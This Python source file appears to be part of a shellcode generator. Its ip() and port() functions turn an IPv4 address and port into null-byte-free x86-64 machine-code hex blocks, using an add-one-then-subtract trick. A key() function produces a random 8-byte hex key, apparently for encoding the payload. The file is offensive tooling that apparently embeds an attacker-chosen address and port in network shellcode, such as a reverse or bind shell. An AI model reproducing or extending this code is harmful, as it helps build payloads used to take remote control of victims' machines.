from random import random
from random import randint


def ip(ip: str) -> str:
    """
    Create an assembly bloc of instructions for the ip address

    Args:
        ip (str): IPv4 address generated by dechex.ip()

    Returns:
        str: Return the assembly bloc of instructions for the ip address
    """

    ip_bloc = "beip41bdminus4981ed111111114c29ee"
    ip = ip[6:8] + ip[4:6] + ip [2:4] + ip[0:2]
    new_ip = ip
    new_ip = new_ip.replace("0","1")

    minus = ""
    for i in range(0,len(new_ip)):
        if ip[i] == "0" and new_ip[i] == "1":
            minus += "2"
        else :
            minus += "1"

    ip_bloc = ip_bloc.replace("ip",new_ip)
    ip_bloc = ip_bloc.replace("minus",minus)
    return ip_bloc

def port(port: str) -> str:
    
    """
    Create an assembly bloc of instructions for the port 

    Args:
        port (str): Port generated by dechex.port()

    Returns:
        str: Return the assembly bloc of instructions for the port
    """

    port_bloc = "6641beport6641bdminus664181ed1111664529ee664156"
    minus = ""
    
    if(len(port) == 3):
        port = "0" + port
    port = port[2:4] + port[0:2]
    newport = port.replace("0","1")

    for i in range(0,len(newport)):
        if port[i] == "0" and newport[i] == "1":
            minus += "2"
        else :
            minus += "1"

    port_bloc = port_bloc.replace("port",newport)
    port_bloc = port_bloc.replace("minus",minus)

    return port_bloc

def key() -> str:
    key = ""
    for i in range(0,8):
        rand = randint(1,255)
        shex = str(hex(int(randint(1,255))))
        shex = shex[2:]
        if len(shex) == 1:
            shex = '0' + shex
        key += shex

    return key